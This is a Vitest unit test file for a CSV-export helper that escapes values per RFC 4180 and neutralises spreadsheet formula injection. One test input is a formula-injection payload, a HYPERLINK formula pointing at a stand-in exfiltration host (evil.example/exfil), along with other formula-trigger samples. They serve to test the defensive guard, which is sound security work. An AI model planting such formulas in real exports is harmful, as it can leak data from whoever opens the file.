/**
 * Pure-function unit tests for the disbursement-export CSV helpers.
 *
 * NOT DB-gated — covers `csvEscape` which is the OWASP CSV-formula-
 * injection guard. The DB-backed end-to-end tests live in
 * routes/super-admin/disbursements.test.ts.
 */

import { describe, expect, it } from 'vitest'

import { csvEscape } from './disbursement-export.js'

describe('csvEscape — CSV-formula-injection guard (OWASP CWE-1236)', () => {
  it('returns empty string for null / undefined / empty', () => {
    expect(csvEscape(null)).toBe('')
    expect(csvEscape(undefined)).toBe('')
    expect(csvEscape('')).toBe('')
  })

  it('passes plain text through unchanged', () => {
    expect(csvEscape('Tenant A')).toBe('Tenant A')
    expect(csvEscape('Disb Tenant 2026')).toBe('Disb Tenant 2026')
  })

  it('quotes + escapes embedded commas and quotes per RFC 4180', () => {
    expect(csvEscape('A, B')).toBe('"A, B"')
    expect(csvEscape('She said "hi"')).toBe('"She said ""hi"""')
    expect(csvEscape('line1\nline2')).toBe('"line1\nline2"')
  })

  // ─── Formula-injection guard (the actual security fix) ──────────

  it('prefixes leading `=` to neutralise formula evaluation', () => {
    // Without the guard, Excel would evaluate `=HYPERLINK(...)`.
    // With the guard, the cell renders as the literal string.
    expect(csvEscape('=HYPERLINK("http://evil.example/exfil","click")')).toBe(
      '"\'=HYPERLINK(""http://evil.example/exfil"",""click"")"',
    )
  })

  it('prefixes leading `+`', () => {
    expect(csvEscape('+CMD()')).toBe(`'+CMD()`)
  })

  it('prefixes leading `-`', () => {
    expect(csvEscape('-2+3')).toBe(`'-2+3`)
  })

  it('prefixes leading `@`', () => {
    expect(csvEscape('@SUM(A1:A10)')).toBe(`'@SUM(A1:A10)`)
  })

  it('prefixes leading TAB', () => {
    expect(csvEscape('\tEvil')).toBe(`'\tEvil`)
  })

  it('prefixes leading CR', () => {
    // Leading CR triggers formula evaluation AND needs RFC-4180 quoting.
    expect(csvEscape('\revil')).toBe(`"'\revil"`)
  })

  it('does NOT prefix leading whitespace (regular space)', () => {
    // A leading space is not a formula trigger; we don't want to alter
    // legitimate tenant names that happen to start with a space.
    expect(csvEscape(' Plain')).toBe(' Plain')
  })

  it('does NOT prefix when formula char appears mid-string', () => {
    // Mid-string `=` is not a formula trigger; only leading chars are.
    // No quote either since no QUOTABLE char present.
    expect(csvEscape('Plain = thing')).toBe('Plain = thing')
    expect(csvEscape('a+b')).toBe('a+b')
  })

  it('handles formula prefix combined with commas (both guards apply)', () => {
    // Malicious tenant name with both injection vectors.
    expect(csvEscape('=BAD(),tenant')).toBe(`"'=BAD(),tenant"`)
  })
})
